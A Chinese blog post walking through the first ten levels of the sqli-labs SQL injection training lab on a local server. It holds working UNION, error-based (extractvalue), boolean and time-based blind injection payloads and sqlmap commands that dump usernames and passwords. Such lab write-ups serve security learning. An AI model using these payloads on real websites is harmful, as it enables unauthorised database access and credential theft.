@@ -1,0 +1,725 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/bg/icon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="William Tao">
+  <meta name="keywords" content="websafe">
+  
+    <meta name="description" content="0x01  解题 一、http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1 1、手工UNION联合查询注入 输入单引号，页面报错，信息为’’1’’ LIMIT 0,1’，如下图所示   根据报错信息，可以确定输入参数的内容被存放到一对单引号中间，脑补一下咱们输入的1在数据库中出现的位置为：select … from … where id&#x3D;’1’ …">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQLi_lab测试">
+<meta property="og:url" content="http://example.com/2022/04/10/SQLi-lab%E6%B5%8B%E8%AF%95/index.html">
+<meta property="og:site_name" content="taoke-one 博客">
+<meta property="og:description" content="0x01  解题 一、http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1 1、手工UNION联合查询注入 输入单引号，页面报错，信息为’’1’’ LIMIT 0,1’，如下图所示   根据报错信息，可以确定输入参数的内容被存放到一对单引号中间，脑补一下咱们输入的1在数据库中出现的位置为：select … from … where id&#x3D;’1’ …">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/SQLi-lab%E6%B5%8B%E8%AF%95/clip_image002.gif">
+<meta property="og:image" content="http://example.com/SQLi-lab%E6%B5%8B%E8%AF%95/clip_image004.gif">
+<meta property="og:image" content="http://example.com/SQLi-lab%E6%B5%8B%E8%AF%95/clip_image006.gif">
+<meta property="og:image" content="http://example.com/SQLi-lab%E6%B5%8B%E8%AF%95/clip_image008.gif">
+<meta property="og:image" content="http://example.com/SQLi-lab%E6%B5%8B%E8%AF%95/clip_image010.gif">
+<meta property="og:image" content="http://example.com/SQLi-lab%E6%B5%8B%E8%AF%95/clip_image012.gif">
+<meta property="og:image" content="http://example.com/SQLi-lab%E6%B5%8B%E8%AF%95/clip_image014.gif">
+<meta property="og:image" content="http://example.com/SQLi-lab%E6%B5%8B%E8%AF%95/clip_image016.gif">
+<meta property="og:image" content="http://example.com/SQLi-lab%E6%B5%8B%E8%AF%95/clip_image018.gif">
+<meta property="og:image" content="http://example.com/SQLi-lab%E6%B5%8B%E8%AF%95/clip_image020.gif">
+<meta property="og:image" content="http://example.com/SQLi-lab%E6%B5%8B%E8%AF%95/clip_image022.gif">
+<meta property="og:image" content="http://example.com/SQLi-lab%E6%B5%8B%E8%AF%95/clip_image024.gif">
+<meta property="og:image" content="http://example.com/SQLi-lab%E6%B5%8B%E8%AF%95/clip_image026.gif">
+<meta property="og:image" content="http://example.com/SQLi-lab%E6%B5%8B%E8%AF%95/clip_image028.gif">
+<meta property="og:image" content="http://example.com/SQLi-lab%E6%B5%8B%E8%AF%95/clip_image030.gif">
+<meta property="og:image" content="http://example.com/SQLi-lab%E6%B5%8B%E8%AF%95/clip_image032.gif">
+<meta property="og:image" content="http://example.com/SQLi-lab%E6%B5%8B%E8%AF%95/clip_image034.gif">
+<meta property="og:image" content="http://example.com/SQLi-lab%E6%B5%8B%E8%AF%95/clip_image036.gif">
+<meta property="og:image" content="http://example.com/SQLi-lab%E6%B5%8B%E8%AF%95/clip_image038.gif">
+<meta property="og:image" content="http://example.com/SQLi-lab%E6%B5%8B%E8%AF%95/clip_image040.gif">
+<meta property="og:image" content="http://example.com/SQLi-lab%E6%B5%8B%E8%AF%95/clip_image042.gif">
+<meta property="og:image" content="http://example.com/SQLi-lab%E6%B5%8B%E8%AF%95/clip_image044.gif">
+<meta property="og:image" content="http://example.com/SQLi-lab%E6%B5%8B%E8%AF%95/clip_image046.gif">
+<meta property="og:image" content="http://example.com/SQLi-lab%E6%B5%8B%E8%AF%95/clip_image048.gif">
+<meta property="og:image" content="http://example.com/SQLi-lab%E6%B5%8B%E8%AF%95/clip_image050.gif">
+<meta property="og:image" content="http://example.com/SQLi-lab%E6%B5%8B%E8%AF%95/clip_image052.gif">
+<meta property="og:image" content="http://example.com/SQLi-lab%E6%B5%8B%E8%AF%95/clip_image054.gif">
+<meta property="og:image" content="http://example.com/SQLi-lab%E6%B5%8B%E8%AF%95/clip_image056.gif">
+<meta property="og:image" content="http://example.com/SQLi-lab%E6%B5%8B%E8%AF%95/clip_image058.gif">
+<meta property="og:image" content="http://example.com/SQLi-lab%E6%B5%8B%E8%AF%95/clip_image060.gif">
+<meta property="og:image" content="http://example.com/SQLi-lab%E6%B5%8B%E8%AF%95/clip_image062.gif">
+<meta property="og:image" content="http://example.com/SQLi-lab%E6%B5%8B%E8%AF%95/clip_image064.gif">
+<meta property="og:image" content="http://example.com/SQLi-lab%E6%B5%8B%E8%AF%95/clip_image066.gif">
+<meta property="og:image" content="http://example.com/SQLi-lab%E6%B5%8B%E8%AF%95/clip_image068.gif">
+<meta property="og:image" content="http://example.com/SQLi-lab%E6%B5%8B%E8%AF%95/clip_image070.gif">
+<meta property="og:image" content="http://example.com/SQLi-lab%E6%B5%8B%E8%AF%95/clip_image072.gif">
+<meta property="og:image" content="http://example.com/SQLi-lab%E6%B5%8B%E8%AF%95/clip_image074.gif">
+<meta property="og:image" content="http://example.com/SQLi-lab%E6%B5%8B%E8%AF%95/clip_image076.gif">
+<meta property="og:image" content="http://example.com/SQLi-lab%E6%B5%8B%E8%AF%95/clip_image078.gif">
+<meta property="og:image" content="http://example.com/SQLi-lab%E6%B5%8B%E8%AF%95/clip_image080.gif">
+<meta property="og:image" content="http://example.com/SQLi-lab%E6%B5%8B%E8%AF%95/clip_image082.gif">
+<meta property="og:image" content="http://example.com/SQLi-lab%E6%B5%8B%E8%AF%95/clip_image084.gif">
+<meta property="og:image" content="http://example.com/SQLi-lab%E6%B5%8B%E8%AF%95/clip_image086.gif">
+<meta property="og:image" content="http://example.com/SQLi-lab%E6%B5%8B%E8%AF%95/clip_image088.gif">
+<meta property="og:image" content="http://example.com/SQLi-lab%E6%B5%8B%E8%AF%95/clip_image090.gif">
+<meta property="og:image" content="http://example.com/SQLi-lab%E6%B5%8B%E8%AF%95/clip_image092.gif">
+<meta property="og:image" content="http://example.com/SQLi-lab%E6%B5%8B%E8%AF%95/clip_image094.gif">
+<meta property="og:image" content="http://example.com/SQLi-lab%E6%B5%8B%E8%AF%95/clip_image096.gif">
+<meta property="og:image" content="http://example.com/SQLi-lab%E6%B5%8B%E8%AF%95/clip_image098.gif">
+<meta property="og:image" content="http://example.com/SQLi-lab%E6%B5%8B%E8%AF%95/clip_image100.gif">
+<meta property="og:image" content="http://example.com/SQLi-lab%E6%B5%8B%E8%AF%95/clip_image102.gif">
+<meta property="og:image" content="http://example.com/SQLi-lab%E6%B5%8B%E8%AF%95/clip_image104.gif">
+<meta property="og:image" content="http://example.com/SQLi-lab%E6%B5%8B%E8%AF%95/clip_image106.gif">
+<meta property="og:image" content="http://example.com/SQLi-lab%E6%B5%8B%E8%AF%95/clip_image108.gif">
+<meta property="og:image" content="http://example.com/SQLi-lab%E6%B5%8B%E8%AF%95/clip_image110.gif">
+<meta property="og:image" content="http://example.com/SQLi-lab%E6%B5%8B%E8%AF%95/clip_image112.gif">
+<meta property="og:image" content="http://example.com/SQLi-lab%E6%B5%8B%E8%AF%95/clip_image114.gif">
+<meta property="og:image" content="http://example.com/SQLi-lab%E6%B5%8B%E8%AF%95/clip_image116.gif">
+<meta property="og:image" content="http://example.com/SQLi-lab%E6%B5%8B%E8%AF%95/clip_image118.gif">
+<meta property="og:image" content="http://example.com/SQLi-lab%E6%B5%8B%E8%AF%95/clip_image120.gif">
+<meta property="og:image" content="http://example.com/SQLi-lab%E6%B5%8B%E8%AF%95/clip_image122.gif">
+<meta property="og:image" content="http://example.com/SQLi-lab%E6%B5%8B%E8%AF%95/clip_image124.gif">
+<meta property="og:image" content="http://example.com/SQLi-lab%E6%B5%8B%E8%AF%95/clip_image126.gif">
+<meta property="article:published_time" content="2022-04-10T14:56:06.000Z">
+<meta property="article:modified_time" content="2022-04-10T15:03:56.000Z">
+<meta property="article:author" content="William Tao">
+<meta property="article:tag" content="websafe">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/SQLi-lab%E6%B5%8B%E8%AF%95/clip_image002.gif">
+  
+  
+  <title>SQLi_lab测试 - taoke-one 博客</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hint.css@2/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.14","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>导航</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="SQLi_lab测试">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2022-04-10 22:56" pubdate>
+        2022年4月10日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      10k 字
+    </span>
+  
+
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      86 分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">SQLi_lab测试</h1>
+            
+            <div class="markdown-body">
+              <p><strong>0x01</strong>  <strong>解题</strong></p>
+<p>一、<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-1/?id=1">http://127.0.0.1/sqli-labs-master/Less-1/?id=1</a></p>
+<p>1、手工UNION联合查询注入</p>
+<p>输入单引号，页面报错，信息为’’1’’ LIMIT 0,1’，如下图所示</p>
+<p> <img src="/../SQLi-lab%E6%B5%8B%E8%AF%95/clip_image002.gif" srcset="/img/loading.gif" lazyload alt="IMG_256"></p>
+<p>根据报错信息，可以确定输入参数的内容被存放到一对单引号中间，脑补一下咱们输入的1在数据库中出现的位置为：select … from … where id&#x3D;’1’ ……，多余的步骤不多说了，直接开始爆数据吧。</p>
+<p>爆表</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1</span>/sqli-labs-master/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">0</span>&#x27; union select <span class="hljs-number">1</span>,group_concat(table_name),<span class="hljs-number">3</span> from information_schema.tables where table_schema=database() --+<br></code></pre></td></tr></table></figure>
+
+<p> <img src="/../SQLi-lab%E6%B5%8B%E8%AF%95/clip_image004.gif" srcset="/img/loading.gif" lazyload alt="IMG_257"></p>
+<p>爆列（字段）</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1</span>/sqli-labs-master/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">0</span>&#x27; union select <span class="hljs-number">1</span>,group_concat(column_name),<span class="hljs-number">3</span> from information_schema.columns where table_name=&#x27;users&#x27; --+<br></code></pre></td></tr></table></figure>
+
+<p> <img src="/../SQLi-lab%E6%B5%8B%E8%AF%95/clip_image006.gif" srcset="/img/loading.gif" lazyload alt="IMG_258"></p>
+<p>爆值</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1</span>/sqli-labs-master/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">0</span>&#x27; union select <span class="hljs-number">1</span>,group_concat(username,<span class="hljs-number">0</span>x3a,password),<span class="hljs-number">3</span> from users--+<br></code></pre></td></tr></table></figure>
+
+<p> <img src="/../SQLi-lab%E6%B5%8B%E8%AF%95/clip_image008.gif" srcset="/img/loading.gif" lazyload alt="IMG_259"></p>
+<p>2、手工报错型注入</p>
+<p>爆表</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1</span>/sqli-labs-master/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">1</span>&#x27; and <span class="hljs-number">1</span>=extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) --+<br></code></pre></td></tr></table></figure>
+
+<p> <img src="/../SQLi-lab%E6%B5%8B%E8%AF%95/clip_image010.gif" srcset="/img/loading.gif" lazyload alt="IMG_260"></p>
+<p>爆列（字段）</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1</span>/sqli-labs-master/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">1</span>&#x27; and <span class="hljs-number">1</span>=extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;))) --+<br></code></pre></td></tr></table></figure>
+
+<p> <img src="/../SQLi-lab%E6%B5%8B%E8%AF%95/clip_image012.gif" srcset="/img/loading.gif" lazyload alt="IMG_261"></p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli-labs-master/Less<span class="hljs-number">-1</span>/?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and 1=extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="hljs-string">&#x27; and column_name not in (&#x27;</span>user_id<span class="hljs-string">&#x27;,&#x27;</span>first_nam<span class="hljs-string">e&#x27;,&#x27;</span>last_nam<span class="hljs-string">e&#x27;,&#x27;</span>us<span class="hljs-string">&#x27;)))) --+</span><br></code></pre></td></tr></table></figure>
+
+<p> <img src="/../SQLi-lab%E6%B5%8B%E8%AF%95/clip_image014.gif" srcset="/img/loading.gif" lazyload alt="IMG_262"></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-regexp">/sqli-labs-master/</span>Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and 1=extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="hljs-string">&#x27; and column_name not in (&#x27;</span>user_id<span class="hljs-string">&#x27;,&#x27;</span>first_name<span class="hljs-string">&#x27;,&#x27;</span>last_name<span class="hljs-string">&#x27;,&#x27;</span>us<span class="hljs-string">&#x27;,&#x27;</span>use<span class="hljs-string">r&#x27;,&#x27;</span>password<span class="hljs-string">&#x27;,&#x27;</span>avata<span class="hljs-string">r&#x27;,&#x27;</span>last_login<span class="hljs-string">&#x27;)))) --+</span><br></code></pre></td></tr></table></figure>
+
+<p> <img src="/../SQLi-lab%E6%B5%8B%E8%AF%95/clip_image016.gif" srcset="/img/loading.gif" lazyload alt="IMG_263"></p>
+<p>爆值</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1</span>/sqli-labs-master/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">1</span>&#x27; and <span class="hljs-number">1</span>=extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select group_concat(username,<span class="hljs-number">0</span>x3a,password) from users)))--+<br></code></pre></td></tr></table></figure>
+
+<p> <img src="/../SQLi-lab%E6%B5%8B%E8%AF%95/clip_image018.gif" srcset="/img/loading.gif" lazyload alt="IMG_264"></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1</span>/sqli-labs-master/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">1</span>&#x27; and <span class="hljs-number">1</span>=extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select group_concat(username,<span class="hljs-number">0</span>x3a,password) from users where username not in (&#x27;Dumb&#x27;,&#x27;I-kill-you&#x27;))))--+<br></code></pre></td></tr></table></figure>
+
+<p> <img src="/../SQLi-lab%E6%B5%8B%E8%AF%95/clip_image020.gif" srcset="/img/loading.gif" lazyload alt="IMG_265"></p>
+<p>步骤类似，就不重复做了</p>
+<p>3、借助SQLMAP工具进行注入</p>
+<p>本工具中使用-v 0参数只是为了更好的截图……</p>
+<p>sqlmap.py -u <a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-1/?id=1">http://127.0.0.1/sqli-labs-master/Less-1/?id=1</a> –technique UE –dbms mysql –batch –v 0</p>
+<p> <img src="/../SQLi-lab%E6%B5%8B%E8%AF%95/clip_image022.gif" srcset="/img/loading.gif" lazyload alt="IMG_266"></p>
+<p>sqlmap.py -u <a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-1/?id=1">http://127.0.0.1/sqli-labs-master/Less-1/?id=1</a> –technique UE –dbms mysql –dbs –batch -v 0</p>
+<p> <img src="/../SQLi-lab%E6%B5%8B%E8%AF%95/clip_image024.gif" srcset="/img/loading.gif" lazyload alt="IMG_267"></p>
+<p>sqlmap.py -u <a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-1/?id=1">http://127.0.0.1/sqli-labs-master/Less-1/?id=1</a> –technique UE –dbms mysql -D security –tables –batch -v 0</p>
+<p> <img src="/../SQLi-lab%E6%B5%8B%E8%AF%95/clip_image026.gif" srcset="/img/loading.gif" lazyload alt="IMG_268"></p>
+<p>sqlmap.py -u <a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-1/?id=1">http://127.0.0.1/sqli-labs-master/Less-1/?id=1</a> –technique UE –dbms mysql -D security -T users –columns –batch -v 0</p>
+<p> <img src="/../SQLi-lab%E6%B5%8B%E8%AF%95/clip_image028.gif" srcset="/img/loading.gif" lazyload alt="IMG_269"></p>
+<p>sqlmap.py -u <a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-1/?id=1">http://127.0.0.1/sqli-labs-master/Less-1/?id=1</a> –technique UE –dbms mysql -D security -T users -C username,password –dump –batch -v 0</p>
+<p> <img src="/../SQLi-lab%E6%B5%8B%E8%AF%95/clip_image030.gif" srcset="/img/loading.gif" lazyload alt="IMG_270"></p>
+<p>其它库、表、字段就不一一爆了，，，</p>
+<p>二、<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-2/?id=1">http://127.0.0.1/sqli-labs-master/Less-2/?id=1</a></p>
+<p>输入单引号，根据报错信息确定咱们输入的内容被原封不动的带入到数据库中，也可叫做数字型注入，把第一题中id&#x3D;1后面的单引号去掉，其它保持不变就行了，不再重复了……</p>
+<p>三、<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-3/?id=1">http://127.0.0.1/sqli-labs-master/Less-3/?id=1</a></p>
+<p>输入单引号，根据报错信息确定咱们输入的内容存放到一对单引号加圆括号中了，脑补一下咱们输入1在数据库语句中的位置，形如select … from … where id&#x3D;(‘1’) …，在第一题中id&#x3D;1‘的后面单引号加上），其它保持不变就行了，不再重复了……</p>
+<p>四、<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-4/?id=1">http://127.0.0.1/sqli-labs-master/Less-4/?id=1</a></p>
+<p>输入单引号，页面无任何变化，尝试输入双引号，页面报错，根据报错信息判断出咱们输入的内容被放到一队双引号和圆括号中，脑补一下：select … from … where id&#x3D;(”1”) …，把第一题中1后面的引号换成双引号加）就可以了……</p>
+<p>五、<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-5/?id=1">http://127.0.0.1/sqli-labs-master/Less-5/?id=1</a></p>
+<p> <img src="/../SQLi-lab%E6%B5%8B%E8%AF%95/clip_image032.gif" srcset="/img/loading.gif" lazyload alt="IMG_271"></p>
+<p>看到这个报错信息，第一反应就行布尔型盲注、报错型注入、时间延迟型盲注了，十有八九UNION联合查询型注入不能用了……</p>
+<p>简单测试下，猜测都是对的，下面给出验证时间延迟型的盲注：</p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-5/?id=1%E2%80%99">http://127.0.0.1/sqli-labs-master/Less-5/?id=1’</a> and sleep(5)–+</p>
+<p>报错注入，方法和第一题一样，都是单引号型的</p>
+<p>布尔型和时间延迟型盲注建议采用sqlmap去跑吧……</p>
+<p> <img src="/../SQLi-lab%E6%B5%8B%E8%AF%95/clip_image034.gif" srcset="/img/loading.gif" lazyload alt="IMG_272"></p>
+<p>六、<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-6/?id=1">http://127.0.0.1/sqli-labs-master/Less-6/?id=1</a></p>
+<p>把上一题的单引号换成双引号即可……</p>
+<p>七、<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-7/?id=1">http://127.0.0.1/sqli-labs-master/Less-7/?id=1</a></p>
+<p>几次尝试，不难猜出注释符被过滤了……,直接输入<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-7/?id=1&#39;">http://127.0.0.1/sqli-labs-master/Less-7/?id=1&#39;</a> and ‘1’&#x3D;’1</p>
+<p>由报错信息不难看出报错型注入基本没戏的，直接布尔型盲注或者时间盲注，使用sqlmap跑，</p>
+<p>sqlmap.py -u <a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-7/?id=1">http://127.0.0.1/sqli-labs-master/Less-7/?id=1</a> –technique B –dbms mysql –batch -v 0</p>
+<p> <img src="/../SQLi-lab%E6%B5%8B%E8%AF%95/clip_image036.gif" srcset="/img/loading.gif" lazyload alt="IMG_273"></p>
+<p>八、<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-8/?id=1">http://127.0.0.1/sqli-labs-master/Less-8/?id=1</a></p>
+<p>输入内容被放到一对单引号中，注释符可用，构造payload：</p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-8/?id=1%27%20and%201=1%20--+">http://127.0.0.1/sqli-labs-master/Less-8/?id=1%27%20and%201=1%20--+</a></p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-8/?id=1%27%20and%202=1%20--+">http://127.0.0.1/sqli-labs-master/Less-8/?id=1%27%20and%202=1%20--+</a></p>
+<p>判断出存在布尔型盲注，使用sqlmap跑，和第七题一样……</p>
+<p>sqlmap.py -u <a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-8/?id=1">http://127.0.0.1/sqli-labs-master/Less-8/?id=1</a> –technique B –dbms mysql –batch -v 0</p>
+<p> <img src="/../SQLi-lab%E6%B5%8B%E8%AF%95/clip_image038.gif" srcset="/img/loading.gif" lazyload alt="IMG_274"></p>
+<p>九、<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-9/?id=1">http://127.0.0.1/sqli-labs-master/Less-9/?id=1</a></p>
+<p>参数内容被放到一对单引号中，不用脑补了……注释符可用</p>
+<p>简单判断下：<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-9/?id=1%27%20and%20sleep(5)%20--+">http://127.0.0.1/sqli-labs-master/Less-9/?id=1%27%20and%20sleep(5)%20--+</a></p>
+<p>页面响应延迟，判断存在时间延迟型注入，直接用sqlmap跑，</p>
+<p>sqlmap.py -u <a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-9/?id=1">http://127.0.0.1/sqli-labs-master/Less-9/?id=1</a> –technique T –dbms mysql –batch -v 0</p>
+<p> <img src="/../SQLi-lab%E6%B5%8B%E8%AF%95/clip_image040.gif" srcset="/img/loading.gif" lazyload alt="IMG_275"></p>
+<p>十、<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-10/?id=1">http://127.0.0.1/sqli-labs-master/Less-10/?id=1</a></p>
+<p>输入的参数内容即1被放到一对双引号中，注释符可用</p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-10/?id=1%22%20and%20sleep(5)--+">http://127.0.0.1/sqli-labs-master/Less-10/?id=1%22%20and%20sleep(5)--+</a></p>
+<p>页面响应延迟，存在时间延迟型注入，直接使用sqlmap跑，，，</p>
